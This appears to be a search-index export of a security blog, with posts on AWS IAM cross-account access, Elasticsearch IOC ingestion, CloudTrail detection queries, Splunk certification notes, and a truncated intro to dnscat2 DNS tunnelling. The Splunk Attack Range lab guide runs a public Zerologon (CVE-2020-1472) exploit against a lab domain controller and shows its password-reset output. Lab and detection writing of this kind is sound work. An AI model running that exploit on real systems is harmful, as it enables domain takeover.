[{"content":"You can configure access to CodeCommit repositories for IAM Role attached to an EC2 Instance in another AWS account. This is often referred to as cross-account access. This section provides an example and instructions for configuring cross-account access for a repo named SharedDemoRepo in the US East (Ohio) Region in an AWS account (referred to as AccountA) to an IAM Role/Instance Profile attached to an EC2 Instance in another AWS account (referred to as AccountB).\nThis section is divided into three parts:\nPart 1: Actions for the IAM Role in AccountA Part 2: Actions for the IAM Role in AccountB Part 3: Configuration on EC2 Instance in AccountB Part 1: Actions for the IAM Role in AccountA To allow IAM Roles in AccountB to access a repository in AccountA, an AccountA administrator must:\nCreate a policy in AccountA that grants access to the repository. Create a role in AccountA that can be assumed by IAM Role in AccountB. Attach the policy to the role. The following sections provide steps and examples.\nStep 1: Create a policy for repo SharedDemoRepo access in AccountA {\r\u0026#34;Version\u0026#34;: \u0026#34;2012-10-17\u0026#34;,\r\u0026#34;Statement\u0026#34;: [\r{\r\u0026#34;Effect\u0026#34;: \u0026#34;Allow\u0026#34;,\r\u0026#34;Action\u0026#34;: [\r\u0026#34;codecommit:BatchGet*\u0026#34;,\r\u0026#34;codecommit:Create*\u0026#34;,\r\u0026#34;codecommit:DeleteBranch\u0026#34;,\r\u0026#34;codecommit:Get*\u0026#34;,\r\u0026#34;codecommit:List*\u0026#34;,\r\u0026#34;codecommit:Describe*\u0026#34;,\r\u0026#34;codecommit:Put*\u0026#34;,\r\u0026#34;codecommit:Post*\u0026#34;,\r\u0026#34;codecommit:Merge*\u0026#34;,\r\u0026#34;codecommit:Test*\u0026#34;,\r\u0026#34;codecommit:Update*\u0026#34;,\r\u0026#34;codecommit:GitPull\u0026#34;,\r\u0026#34;codecommit:GitPush\u0026#34;\r],\r\u0026#34;Resource\u0026#34;: [\r\u0026#34;arn:aws:codecommit:us-east-2:${ACCOUNTA_ID}:SharedDemoRepo\u0026#34;\r]\r},\r{\r\u0026#34;Effect\u0026#34;: \u0026#34;Allow\u0026#34;,\r\u0026#34;Action\u0026#34;: \u0026#34;codecommit:ListRepositories\u0026#34;,\r\u0026#34;Resource\u0026#34;: \u0026#34;*\u0026#34;\r}\r]\r} Step 2: Create a role for repo access in AccountA Create a new Role CrossAccountRepoAccessRole and attach the above policy to that role.\nPart 2: Actions for the IAM Role in AccountB To allow an EC2 Instance in AccountB to access a repository in AccountA, the AccountB administrator must create a IAM Role that can be attached to an EC2 Instance in AccountB. This role must be configured with a policy that allows the EC2 Instance to assume the role created in the AccountA.\nThe following sections provide steps and examples.\nStep 1: Create a policy for repo access in AccountB {\r\u0026#34;Version\u0026#34;: \u0026#34;2012-10-17\u0026#34;,\r\u0026#34;Statement\u0026#34;: {\r\u0026#34;Effect\u0026#34;: \u0026#34;Allow\u0026#34;,\r\u0026#34;Action\u0026#34;: \u0026#34;sts:AssumeRole\u0026#34;,\r\u0026#34;Resource\u0026#34;: \u0026#34;arn:aws:iam::${ACCOUNTA_ID}:role/CrossAccountRepoAccessRole\u0026#34;\r}\r} Step 2: Create a role for an AWS Service \u0026ldquo;EC2\u0026rdquo; Create a new Role CrossAccountRepoAccessRole for an AWS Service \u0026ldquo;EC2\u0026rdquo; (it will create the following trust relationship for the role to be assummed from an EC2 Instance ) and attach the above policy to that role.\n{\r\u0026#34;Version\u0026#34;: \u0026#34;2012-10-17\u0026#34;,\r\u0026#34;Statement\u0026#34;: [\r{\r\u0026#34;Effect\u0026#34;: \u0026#34;Allow\u0026#34;,\r\u0026#34;Principal\u0026#34;: {\r\u0026#34;Service\u0026#34;: \u0026#34;ec2.amazonaws.com\u0026#34;\r},\r\u0026#34;Action\u0026#34;: \u0026#34;sts:AssumeRole\u0026#34;\r}\r]\r} Part 3: Configuration on EC2 Instance in AccountB To access the repositories in AccountA, users in the AccountB must configure the EC2 Instance for repositories access. The following sections provide steps and examples.\nPrerequisite: Please make sure AWS CLI and git package is installed.\nStep 1: Configure the AWS CLI and Git for an AccountB EC2 Instance to access the repositories in AccountA You need to configure the AWS CLI either by using the aws configure --profile command or editing the ~/.aws/config file.\n[profile cross-account-role]\rrole_arn = arn:aws:iam::${ACCOUNTA_ID}:role/CrossAccountRepoAccessRole\rcredential_source = Ec2InstanceMetadata\rregion = us-east-2 You then want to confirm whether you\u0026rsquo;ve set your permissions correctly, you can do:\naws --profile cross-account-role get-repository --repository-name ${REPO_NAME_IN_ACCOUNTA}` Once above is successful, you can configure the git client to use the credential-helper with the correct profile, in your ~/.gitconfig by running:\ngit config --global credential.helper \u0026#39;!aws codecommit --profile \u0026#39;\u0026#34;$PROFILE_NAME\u0026#34;\u0026#39; credential-helper $@\u0026#39;\rgit config --global credential.UseHttpPath true git clone --branch ${BRANCH_NAME} ${REPO_NAME_IN_ACCOUNTA}` Conlusion You can keep your code in CodeCommit Repositories in a central AWS Account and can access from different AWS Accounts using the IAM Roles. Please don\u0026rsquo;t forget to follow the principle of least privileges while configuring above policies in Production environments.\nHope you find this post helpful.\nReferences Configure cross-account access to an AWS CodeCommit repository using roles Installing or updating the latest version of the AWS CLI ","permalink":"https://www.logsec.cloud/posts/cross-account-access-codecommit-repo/","summary":"You can configure access to CodeCommit repositories for IAM Role attached to an EC2 Instance in another AWS account. This is often referred to as cross-account access. This section provides an example and instructions for configuring cross-account access for a repo named SharedDemoRepo in the US East (Ohio) Region in an AWS account (referred to as AccountA) to an IAM Role/Instance Profile attached to an EC2 Instance in another AWS account (referred to as AccountB).","title":"Configure cross-account access from an EC2 Instance to an AWS CodeCommit repo using roles"},{"content":"Recently, I\u0026rsquo;ve been working on understanding and detecting Log4j vulnerability using Elasticsearch. If you want to know more about this vulnerability, I would suggest read the blog series https://www.securitynik.com/2021/12/beginning-log4-shell-understanding.html by Nik Alleyne on his blog securitynik.com.\nTo detect outbound traffic going to IOC\u0026rsquo;s related to Log4j, needed to upload a csv data to Elasticsearch. To achieve that I followed the following steps:\n1. First create a new index logs-threat-intel Using the Dev Tools in Kibana, isse the Create Index API\nPUT /logs-threat-intel\r{\r\u0026#34;settings\u0026#34;: {\r\u0026#34;number_of_shards\u0026#34;: 1\r},\r\u0026#34;mappings\u0026#34;: {\r\u0026#34;properties\u0026#34;: {\r\u0026#34;ioc.ip\u0026#34;: { \u0026#34;type\u0026#34;: \u0026#34;ip\u0026#34; },\r\u0026#34;ioc.url\u0026#34;: { \u0026#34;type\u0026#34;: \u0026#34;keyword\u0026#34; },\r\u0026#34;threatintel.indicator.signature\u0026#34;: {\u0026#34;type\u0026#34;: \u0026#34;keyword\u0026#34;},\r\u0026#34;@timestamp\u0026#34;:{ \u0026#34;type\u0026#34; : \u0026#34;date\u0026#34;, \u0026#34;format\u0026#34; : \u0026#34;strict_date_optional_time_nanos\u0026#34;},\r\u0026#34;event.ingested\u0026#34;:{ \u0026#34;type\u0026#34; : \u0026#34;date\u0026#34;, \u0026#34;format\u0026#34; : \u0026#34;strict_date_optional_time_nanos\u0026#34;},\r\u0026#34;event.module\u0026#34;: {\u0026#34;type\u0026#34;: \u0026#34;keyword\u0026#34;},\r\u0026#34;event.category\u0026#34;: {\u0026#34;type\u0026#34;: \u0026#34;keyword\u0026#34;},\r\u0026#34;event.type\u0026#34;: {\u0026#34;type\u0026#34;: \u0026#34;keyword\u0026#34;},\r\u0026#34;event.kind\u0026#34;: {\u0026#34;type\u0026#34;: \u0026#34;keyword\u0026#34;}\r}\r}\r} 2. Create a new Ingest Node Pipeline logs-threat-intel-pipeline Ingest pipelines let you perform common transformations on your data before indexing. For example, you can use pipelines to remove fields, extract values from text, and enrich your data.\nPUT _ingest/pipeline/logs-threat-intel-pipeline\r{\r\u0026#34;description\u0026#34;: \u0026#34;Ingest Pipeline for the index logs-threat-intel\u0026#34;,\r\u0026#34;processors\u0026#34;: [\r{\r\u0026#34;set\u0026#34;: {\r\u0026#34;field\u0026#34;: \u0026#34;@timestamp\u0026#34;,\r\u0026#34;value\u0026#34;: \u0026#34;{{_ingest.timestamp}}\u0026#34;\r}\r},\r{\r\u0026#34;set\u0026#34;: {\r\u0026#34;field\u0026#34;: \u0026#34;event.ingested\u0026#34;,\r\u0026#34;value\u0026#34;: \u0026#34;{{_ingest.timestamp}}\u0026#34;\r}\r},\r{\r\u0026#34;set\u0026#34;: {\r\u0026#34;field\u0026#34;: \u0026#34;event.module\u0026#34;,\r\u0026#34;value\u0026#34;: \u0026#34;threatintel\u0026#34;\r}\r},\r{\r\u0026#34;set\u0026#34;: {\r\u0026#34;field\u0026#34;: \u0026#34;event.category\u0026#34;,\r\u0026#34;value\u0026#34;: \u0026#34;threat\u0026#34;\r}\r},\r{\r\u0026#34;set\u0026#34;: {\r\u0026#34;field\u0026#34;: \u0026#34;event.type\u0026#34;,\r\u0026#34;value\u0026#34;: \u0026#34;indicator\u0026#34;\r}\r},\r{\r\u0026#34;set\u0026#34;: {\r\u0026#34;field\u0026#34;: \u0026#34;event.kind\u0026#34;,\r\u0026#34;value\u0026#34;: \u0026#34;enrichment\u0026#34;\r}\r}\r]\r} 3. Next, map the Ingest Node Pipeline created in Step 2 with the index created in Step 1. PUT logs-threat-intel/_settings\r{\r\u0026#34;index.default_pipeline\u0026#34;: \u0026#34;logs-threat-intel-pipeline\u0026#34;\r} 4. Example on how to ingest new IOC\u0026rsquo;s POST logs-threat-intel/_doc/1\r{\r\u0026#34;ioc.ip\u0026#34;: \u0026#34;\u0026lt;IPv4/IPv6\u0026gt;\u0026#34;\r} POST logs-threat-intel/_doc/2\r{\r\u0026#34;ioc.url\u0026#34;: \u0026#34;\u0026lt;URL\u0026gt;\u0026#34;\r} Replace the IPv4/IPv6 and URL with respective IP or urls. Above technique works, but not quite scalable if we need ingest a big list of IOC\u0026rsquo;s. As an example, we need to ingest Log4j CSV downloaded from Microsoft blog. To achieve that, wrote this 4 liner bash script:\nwhile read f1 do curl -k -X POST \u0026#39;https://\u0026lt;ELASTICSEARCH_URL/ELASTICSEARCH_IP\u0026gt;:9200/logs-threat-intel/_doc/?pretty\u0026#39; -H \u0026#34;Content-Type: application/json\u0026#34; -u \u0026lt;USERNAME\u0026gt;:\u0026lt;PASSWORD\u0026gt; -d \u0026#34;{ \\\u0026#34;ioc.ip\\\u0026#34;: \\\u0026#34;$f1\\\u0026#34;, \\\u0026#34;threatintel.indicator.signature\\\u0026#34;: \\\u0026#34;log4j\\\u0026#34;}\u0026#34; done \u0026gt; /dev/null 2\u0026gt;\u0026amp;1 \u0026amp; \u0026lt; log4j-ioc.csv Above script reads the contents of the file log4j-ioc.csv one at a time and ingest to elasticsearch under the index logs-threat-intel.\nReferences: Create index API: https://www.elastic.co/guide/en/elasticsearch/reference/current/indices-create-index.html Create or update pipeline API: https://www.elastic.co/guide/en/elasticsearch/reference/current/put-pipeline-api.html ","permalink":"https://www.logsec.cloud/posts/upload-csv-to-elastic/","summary":"Recently, I\u0026rsquo;ve been working on understanding and detecting Log4j vulnerability using Elasticsearch. If you want to know more about this vulnerability, I would suggest read the blog series https://www.securitynik.com/2021/12/beginning-log4-shell-understanding.html by Nik Alleyne on his blog securitynik.com.\nTo detect outbound traffic going to IOC\u0026rsquo;s related to Log4j, needed to upload a csv data to Elasticsearch. To achieve that I followed the following steps:\n1. First create a new index logs-threat-intel Using the Dev Tools in Kibana, isse the Create Index API","title":"Upload CSV Data to Elasticsearch"},{"content":"A quick blog post to share a bash script that I almost use daily to automate the basic GitHub \u0026ldquo;commit and push\u0026rdquo; prcoess. Steps to reproduce:\nCreate a file, for example codecommit.sh and copy/paste the content below: #!/bin/bash RESET=\u0026#34;\\033[0m\u0026#34; BOLD=\u0026#34;\\033[1m\u0026#34; YELLOW=\u0026#34;\\033[38;5;11m\u0026#34; #Get the argument message #read -p \u0026#34;Add Commit message: \u0026#34; message read -p \u0026#34;$(echo -e $BOLD$YELLOW\u0026#34;Add Commit message: \u0026#34;$RESET)\u0026#34; message #Stage all changes git add . #Commit the file(s) git commit -m \u0026#34;$message\u0026#34; echo \u0026#34;Added the commit with message: \u0026#39;$message\u0026#39;\u0026#34; #Get current branch and push changes current_branch=$(git branch --show-current) git push origin \u0026#34;$current_branch\u0026#34; #echo \u0026#34;Pushed changes to \u0026#39;$current_branch\u0026#39; branch\u0026#34; echo -e $BOLD$YELLOW\u0026#34;Pushed changes to \u0026#39;$current_branch\u0026#39; branch\u0026#34;$RESET Move it to the location /usr/local/bin to make this shell script global. MacOS has it in the PATH by default. You can verify this by typing echo $PATH in the terminal. Make this file executable using chmod +x codecommit.sh Make needful local changes Type codecommit.sh and voila! Feel free to comment below for questions/suggestions.\n","permalink":"https://www.logsec.cloud/posts/git-workflow-automation/","summary":"A quick blog post to share a bash script that I almost use daily to automate the basic GitHub \u0026ldquo;commit and push\u0026rdquo; prcoess. Steps to reproduce:\nCreate a file, for example codecommit.sh and copy/paste the content below: #!/bin/bash RESET=\u0026#34;\\033[0m\u0026#34; BOLD=\u0026#34;\\033[1m\u0026#34; YELLOW=\u0026#34;\\033[38;5;11m\u0026#34; #Get the argument message #read -p \u0026#34;Add Commit message: \u0026#34; message read -p \u0026#34;$(echo -e $BOLD$YELLOW\u0026#34;Add Commit message: \u0026#34;$RESET)\u0026#34; message #Stage all changes git add . #Commit the file(s) git commit -m \u0026#34;$message\u0026#34; echo \u0026#34;Added the commit with message: \u0026#39;$message\u0026#39;\u0026#34; #Get current branch and push changes current_branch=$(git branch --show-current) git push origin \u0026#34;$current_branch\u0026#34; #echo \u0026#34;Pushed changes to \u0026#39;$current_branch\u0026#39; branch\u0026#34; echo -e $BOLD$YELLOW\u0026#34;Pushed changes to \u0026#39;$current_branch\u0026#39; branch\u0026#34;$RESET Move it to the location /usr/local/bin to make this shell script global.","title":"GitHub Workflow Automation Script"},{"content":"AWS CloudTrail is an AWS service that helps you enable governance, compliance, and operational and risk auditing of your AWS account. Actions taken by a user, role, or an AWS service are recorded as events in CloudTrail. Events include actions taken in the AWS Management Console, AWS Command Line Interface, and AWS SDKs and APIs.\nYou can ship these CloudTrail logs into the ELK stack and learn how to visualize these events, near real time, using Kibana. Here are some of the KQL (Kibana Query Language) queries that you can use to search for some key CloudTrail events to monitor for Security in AWS.\nPlease note that I\u0026rsquo;m using the index pattern cloudwatch* for the CloudTrail logs.\n1. CloudTrail Logging Turned Off Identifies the deletion of an AWS log trail. An adversary may delete trails in an attempt to evade defenses.\nKQL Query:\n_index:cloudwatch* and eventName:(DeleteTrail or UpdateTrail or StopLogging) MITRE ATT\u0026amp;CK Tactic: Defense Evasion\nMITRE ATT\u0026amp;CK Techniques: T1562 - Impair Defenses\n2. Delete Attempts on CloudTrail S3 Buckets Identifies the deletion of an AWS S3 bucket containing the CloudTrai logs. You can update the requestParameters.bucketName as per the naming convention for the S3 buckets storing CloudTrail logs. An adversary may delete trails in an attempt to evade defenses.\nKQL Query:\n_index:cloudwatch* AND eventName:(DeleteBucket OR DeleteObject OR DeleteObjects) AND requestParameters.bucketName: *logs MITRE ATT\u0026amp;CK Tactics: Impact\nMITRE ATT\u0026amp;CK Techniques: T1485 - (Data Destruction)\n3. Creation of New IAM User Detects creation of new user, in the actual production environment, most probably you will be using federated sign-in through Active Directory (AD) and Active Directory Federation Services (ADFS), instead of local IAM users. With the help of this search, you can easily search if someone creates a new local user.\nKQL Query:\n_index:cloudwatch* AND eventName:CreateUser AND eventSource:iam.amazonaws.com MITRE ATT\u0026amp;CK Tactics: Persistence\nMITRE ATT\u0026amp;CK Techniques: T1136 - Create Account\n4. Cross Account VPC Peering Connections A VPC peering connection is a networking connection between two VPCs that enables you to route traffic between them using private IPv4 addresses or IPv6 addresses. Instances in either VPC can communicate with each other as if they are within the same network. You can create a VPC peering connection between your own VPCs, or with a VPC in another AWS account. The VPCs can be in different regions (also known as an inter-region VPC peering connection).\nThis can produce false positives for cases where VPC peering is created for legitimate purposes, but you can look for events where connection is made between VPC outside of organization.\nKQL Query:\n_index:cloudwatch* and eventSource:\u0026#34;ec2.amazonaws.com\u0026#34; and eventName:\u0026#34;CreateVpcPeeringConnection\u0026#34; MITRE ATT\u0026amp;CK Tactics: Initial Access\nMITRE ATT\u0026amp;CK Techniques: T1199\n5. AWS IAM Backdoor Users Keys Detects AWS API key creation for a user by another user. Backdoored users can be used to obtain persistence in the AWS environment. Also with this alert, you can detect a flow of AWS keys in your org.\nKQL Query:\n((eventSource:\u0026#34;iam.amazonaws.com\u0026#34; AND eventName:\u0026#34;CreateAccessKey\u0026#34;) AND (NOT (userIdentity.arn.keyword:*responseElements.accessKey.userName*))) MITRE ATT\u0026amp;CK Tactics: Persistence\nMITRE ATT\u0026amp;CK Techniques: T1098\nSub-Technique: T1098.001 Additional Cloud Credentials\n6. AWS EC2 Startup Shell Script Change Detects changes to the EC2 instance startup script. The shell script will be executed as root/SYSTEM everytime the specific instances are booted up.\nKQL Query:\n(eventSource:\u0026#34;ec2.amazonaws.com\u0026#34; AND requestParameters.userData.keyword:* AND eventName:\u0026#34;ModifyInstanceAttribute\u0026#34;) 7. AWS - Retrieve Secret on Secrets Manager Detected This rule is identifies when users attempt to access the secrets in AWS Secrets Manager to steal certificates, credentials, or other sensitive material.\nKQL Query:\n(eventSource:\u0026#34;secretsmanager.amazonaws.com\u0026#34; AND eventName:\u0026#34;GetSecretValue\u0026#34;) MITRE ATT\u0026amp;CK Tactics: Credential Access\nMITRE ATT\u0026amp;CK Techniques: T1528\n","permalink":"https://www.logsec.cloud/posts/investigating-cloudtrail-logs-with-elk/","summary":"AWS CloudTrail is an AWS service that helps you enable governance, compliance, and operational and risk auditing of your AWS account. Actions taken by a user, role, or an AWS service are recorded as events in CloudTrail. Events include actions taken in the AWS Management Console, AWS Command Line Interface, and AWS SDKs and APIs.\nYou can ship these CloudTrail logs into the ELK stack and learn how to visualize these events, near real time, using Kibana.","title":"Investigating CloudTrail Logs using ELK Stack"},{"content":"A quick guide to get Splunk Attack Range running on AWS. If you\u0026rsquo;re trying to run this locally, I would suggest to have a look over this post Splunk Attack Range in a virtualized Ubuntu Guest VM.\nIt\u0026rsquo;s a tool that allows you to create vulnerable instrumented local or cloud environments to simulate attacks against and collect the data into Splunk. I came across this Splunk post Detecting CVE-2020-1472 and was trying to replicate this in my own environment. Even the splunk attack range documentation have most of the details, I was still running into some issues, so leaving my notes here for my future self and for everyone else in need. 1. AWS Server SetUp Run an EC2 isntance with Ubuntu 18.04 AMI. This will build a range automatically in Ubuntu 18.04, specifically tested on the AMI. You will need also to sign up for an AWS account here as a prerequisite\n#!/bin/bash\rsudo apt-get update\rsudo apt-get install -y python3-dev git python-dev unzip python-pip awscli python-virtualenv\rwget https://releases.hashicorp.com/terraform/0.12.28/terraform_0.12.28_linux_amd64.zip\runzip terraform_0.12.28_linux_amd64.zip\rsudo mv terraform /usr/local/bin/\rgit clone https://github.com/splunk/attack_range \u0026amp;\u0026amp; cd attack_range\rcd terraform\rterraform init\rcd ..\rvirtualenv -p python3 venv\rsource venv/bin/activate\rpip install -r requirements.txt Edit attack range configuration: You need to change the attack range password. cp attack_range.conf.template attack_range.conf\rvi attack_range.conf Generates ssh keys ssh-keygen with no passphrase Convert Private Key into PEM key openssl rsa -in ~/.ssh/id_rsa -outform pem \u0026gt; id_rsa.pem Go to AWS, and select your preferred region Import public key in your AWS region Also, either rename this key or update the name in the attack_range.conf file. Update ip_whitelist= X.X.X.X/32 to your public IP.\n2. Attack Range SetUp You can now build your first range using:\npython attack_range.py -a build I ran in to error message [ERROR] connection error: dial tcp 54.89.109.252:22: i/o timeout when I updated the ip_whitelist to my public IP in attack_range.conf file, so I went ahead and changed it to 0.0.0.0/0 while building attack_range, and once it completed successfully, I changed back it to my public IP to open the security group only to my ip and things went smooth after that.\nLIST MACHINES python attack_range.py -lm\nStatus EC2 Machines\nName Status IP Address default-attack-range-kali_machine running x.x.x.x default-attack-range-windows-domain-controller running x.x.x.x default-attack-range-splunk-server running x.x.x.x 3. Attack Range Deploy Install git on Kali\nsudo apt update\rsudo apt install git Install pip3 on Kali\nsudo apt install python3-pip Till this step, you should have successfully deployed the attack_range on AWS, it could take up to 15 minutes.\nSplunk can now be accessed via your web browser inside your Guest VM at: http://splunk_instance_public_ip:8000\nSimilarly, other machines can be accesses based on their public IP. While RDPing in to the Windows Server or Domain Controller, default domain name will be ATTACKRANGE.LOCAL and password will be one you updated in the attack_range.conf file.\nNext steps are necessary if you are trying to replicate Detecting CVE-2020-1472 in your environment\nPOC CVE-2020-172 requires the latest impacket from GitHub with added netlogon structures.\n4. Install Impacket cd /opt/\rsudo git clone https://github.com/SecureAuthCorp/impacket.git\rcd impacket/\rsudo pip3 install . [If you see error message: \u0026ldquo;ERROR: ldap3 2.8.1 has requirement pyasn1\u0026gt;=0.4.6, but you\u0026rsquo;ll have pyasn1 0.4.2 which is incompatible.\u0026rdquo;]. Run below comand first sudo pip3 pyasn1-modules -U to resolve the issue.\nsudo pip3 pyasn1-modules -U\rsudo python3 setup.py install 5. Simulate an Attack - CVE-2020-1472 Next go to https://github.com/dirkjanm/CVE-2020-1472\ncd /opt/\rsudo git clone https://github.com/dirkjanm/CVE-2020-1472\rcd CVE-2020-1472/ Execute the exploit by running:\npython cve-2020-1472-exploit.py \u0026lt;DC hostname\u0026gt; 10.0.1.14 kali@kali:/opt/CVE-2020-1472$ python3 cve-2020-1472-exploit.py win-dc-6045942 10.0.1.14\rPerforming authentication attempts...\r===========================================================================================================================\r===========================================================================================================================\r============================================================================\rTarget vulnerable, changing account password to empty string\rResult: 0\rExploit complete! For more information, please read this awesome post from Splunk https://www.splunk.com/en_us/blog/security/detecting-cve-2020-1472-using-splunk-attack-range.html\nReferences Splunk Attack Range in a virtualized Ubuntu Guest VM — Guide https://medium.com/@julian.wieg/splunk-attack-range-in-a-virtualized-ubuntu-guest-vm-guide-c6587f43c15 Detecting CVE-2020-1472 (CISA ED 20-04) Using Splunk Attack Range https://www.splunk.com/en_us/blog/security/detecting-cve-2020-1472-using-splunk-attack-range.html Zerloogon https://www.secura.com/blog/zero-logon CVE-2020-1472 POC https://github.com/dirkjanm/CVE-2020-1472 ","permalink":"https://www.logsec.cloud/posts/splunk-range-setup/","summary":"A quick guide to get Splunk Attack Range running on AWS. If you\u0026rsquo;re trying to run this locally, I would suggest to have a look over this post Splunk Attack Range in a virtualized Ubuntu Guest VM.\nIt\u0026rsquo;s a tool that allows you to create vulnerable instrumented local or cloud environments to simulate attacks against and collect the data into Splunk. I came across this Splunk post Detecting CVE-2020-1472 and was trying to replicate this in my own environment.","title":"Splunk Attack Range on AWS - Guide"},{"content":"I passed my Splunk Enterprise Certified Admin SPLK 1003 cert on September 11th, 2020. While I have been actively working with Splunk as part of my job, clearing the exam however requires a consistent and well planned effort.\nAll these points are taken from the exam blueprint: https://www.splunk.com/pdfs/training/Splunk-Test-Blueprint-Admin-v.1.1.pdf updated with either with Splunk documentation link I studied to prepare for that specific part or youtube video I found useful. Along with these I also bought Udemy Course The Complete Splunk Enterprise Certified Admin Course 2020\nFrom the Splunk Enterprise Certified Admin documentation: https://www.splunk.com/en_us/training/certification-track/splunk-enterprise-certified-admin/overview.html, a Splunk Enterprise Certified Admin manages various components of Splunk Enterprise on a daily basis, including license management, indexers and search heads, configuration, monitoring, and getting data into Splunk. This certification demonstrates an individual\u0026rsquo;s ability to support the day-to-day administration and health of a Splunk Enterprise environment.\n1.0 Splunk Admin Basics (5%) Identify Splunk components Components of Splunk Enterprise: https://docs.splunk.com/Documentation/Splunk/8.0.5/Capacity/ComponentsofaSplunkEnterprisedeployment\nYouTube: https://youtu.be/a-_LHJU07VU Processing Layer Components Indexer Search Head Universal Forwarders (Agents) Heavy Forwarders Indexer\nIndexers index and store data In a distributed environment: Resides on dedicated machines Can be clustered or independent Clustered indexers are known as peer nodes Search Head\nSearch head manage search requests from users Distribute searches across indexers Consolidates the results from the indexers Universal Forwarders (Agents)\nHeavy Forwarders\nForwarders forward data from one Splunk component to another From a source system to an indexer or indexer cluster From a source system directly to a search head (SH) Management Layer Components License Manager Deployment Server Cluster Master Heavy Forwarders License Manager\nClients are called license slaves Manages license pools and stacks Deployment Server\nCentralized configuration manager Manages deployments apps for clients Configured through the forwarder management interface Cluster Master:\nManage index clusters Coordinates the activities within the cluster Manages data replication Manges buckets (storage) for the cluster Handles updates for the indexer cluster Every Splunk component is built using Splunk Enterprise. It’s only a matter of configuration Except the Universal Forwarder, which is a specialized light Splunk Enterprise installation.\n2.0 License Management (5%) Identify license types https://docs.splunk.com/Documentation/Splunk/8.0.5/Admin/TypesofSplunklicenses Understand license violations https://docs.splunk.com/Documentation/Splunk/8.0.5/Admin/Aboutlicenseviolations License Types The Splunk Enterprise license The Splunk Enterprise infrastructure license The Splunk Enterprise Trial license Sales Trial license Dev/Test licenses Free license Forwarder license 3.0 Splunk Configuration Files (5%) Describe Splunk configuration directory structure Understand configuration layering Understand configuration precedence https://docs.splunk.com/Documentation/Splunk/8.0.5/Admin/Configurationfiledirectories Use btool to examine configuration settings https://docs.splunk.com/Documentation/Splunk/8.0.5/Troubleshooting/Usebtooltotroubleshootconfigurations Precedence within global context: When the file context is global, directory priority descends in this order:\nGlobal Context System local directory \u0026ndash; highest priority App local directories App default directories System default directory \u0026ndash; lowest priority Location\nSystem local directory location: $SPLUNK_HOME/etc/system/local App local directories location: $SPLUNK_HOME/etc/apps/\u0026lt;app_name\u0026gt;/local App default directories System default directory location: $SPLUNK_HOME/etc/system/default Precedence within app or user context: For files with an app/user context, directory priority descends from user to app to system:\nApp/User Context User directories for current user \u0026ndash; highest priority App directories for currently running app (local, followed by default) App directories for all other apps (local, followed by default) \u0026ndash; for exported settings only System directories (local, followed by default) \u0026ndash; lowest priority 4.0 Splunk Indexes (10%) Describe index structure\nList types of index buckets: Hot, Warm, Cold, Frozen, Thawed https://docs.splunk.com/Documentation/Splunk/8.0.5/Indexer/HowSplunkstoresindexes\nCheck index data integrity https://docs.splunk.com/Documentation/Splunk/8.0.5/Security/Dataintegritycontrol\nDescribe indexes.conf options\nDescribe the fishbucket https://www.splunk.com/en_us/blog/tips-and-tricks/what-is-this-fishbucket-thing.html\nApply a data retention policy\n5.0 Splunk User Management (5%) Describe user roles in Splunk Create a custom role Add Splunk users https://docs.splunk.com/Documentation/Splunk/8.0.5/Admin/Aboutusersandroles 6.0 Splunk Authentication Management (5%) Integrate Splunk with LDAP https://docs.splunk.com/Documentation/Splunk/8.0.5/Security/SetupuserauthenticationwithLDAP\nList other user authentication options\nDescribe the steps to enable Multifactor Authentication in Splunk https://docs.splunk.com/Documentation/Splunk/8.0.5/Security/AboutMultiFactorAuth\n7.0 Getting Data In (5%) Describe the basic settings for an input: https://docs.splunk.com/Documentation/Splunk/8.0.5/Data/Modifyinputsettings List Splunk forwarder types https://docs.splunk.com/Documentation/Splunk/8.0.5/Forwarding/Typesofforwarders Universal Heavy Light Configure the forwarder https://docs.splunk.com/Documentation/Forwarder/8.0.5/Forwarder/Configuretheuniversalforwarder Add an input to UF using CLI 8.0 Distributed Search (10%) Describe how distributed search works\nExplain the roles of the search head and search peers With distributed search, a Splunk Enterprise instance called a search head sends search requests to a group of indexers, or search peers, which perform the actual searches on their indexes. The search head then merges the results back to the user.\nConfigure a distributed search group https://docs.splunk.com/Documentation/Splunk/8.0.5/DistSearch/Distributedsearchgroups\nList search head scaling options\n9.0 Getting Data In – Staging (5%) List the three phases of the Splunk Indexing process https://docs.splunk.com/Documentation/Splunk/8.0.5/Indexer/Howindexingworks List Splunk input options 10.0 Configuring Forwarders (5%) Configure Forwarders https://youtu.be/S4ekkH5mv3E Identify additional Forwarder options 11.0 Forwarder Management (10%) Explain the use of Deployment Management Describe Splunk Deployment Server Manage forwarders using deployment apps Configure deployment clients https://docs.splunk.com/Documentation/Splunk/8.0.5/Updating/Configuredeploymentclients Configure client groups Monitor forwarder management activities 12.0 Monitor Inputs (5%) Create file and directory monitor inputs https://docs.splunk.com/Documentation/Splunk/8.0.5/Data/MonitorfilesanddirectorieswithSplunkWeb Use optional settings for monitor inputs Deploy a remote monitor input 13.0 Network and Scripted Inputs (5%) Create network (TCP and UDP) inputs: https://docs.splunk.com/Documentation/SplunkCloud/8.0.2007/Data/Monitornetworkports Describe optional settings for network inputs Create a basic scripted input 14.0 Agentless Inputs (5%) Identify Windows input types and uses Describe HTTP Event Collector 15.0 Fine Tuning Inputs (5%) Understand the default processing that occurs during input phase https://docs.splunk.com/Documentation/Splunk/8.0.6/Deploy/Datapipeline Configure input phase options, such as sourcetype fine-tuning and character set Encoding 16.0 Parsing Phase and Data (5%) Understand the default processing that occurs during parsing Optimize and configure event line breaking Explain how timestamps and time zones are extracted or assigned to events Use Data Preview to validate event creation during the parsing phase 17.0 Manipulating Raw Data (5%) Explain how data transformations are defined and invoked Use transformations with props.conf and transforms.conf to: Mask or delete raw data as it is being indexed Override sourcetype or host based upon event values Route events to specific indexes based on event content Prevent unwanted events from being index Use SEDCMD to modify raw data ","permalink":"https://www.logsec.cloud/posts/splunk-enterprise-certified-admin/","summary":"I passed my Splunk Enterprise Certified Admin SPLK 1003 cert on September 11th, 2020. While I have been actively working with Splunk as part of my job, clearing the exam however requires a consistent and well planned effort.\nAll these points are taken from the exam blueprint: https://www.splunk.com/pdfs/training/Splunk-Test-Blueprint-Admin-v.1.1.pdf updated with either with Splunk documentation link I studied to prepare for that specific part or youtube video I found useful. Along with these I also bought Udemy Course The Complete Splunk Enterprise Certified Admin Course 2020","title":"Splunk Enterprise Certified Admin Notes"},{"content":"No matter how tightly you restrict outbound access from your network, you probably allow DNS protocol to at least one server. Adversaries can abuse this access in your firewall to establish stealthy Command and Control (C2) channels or to exfiltrate data that is difficult to block. To understand the use of DNS for C2 tunneling, let’s take a look at Ron Bowes’s tool dnscat2, which makes it relatively easy to experiment with such attack techniques.\nAs per the dnscat2 documentation, author describes this tool as -\na DNS 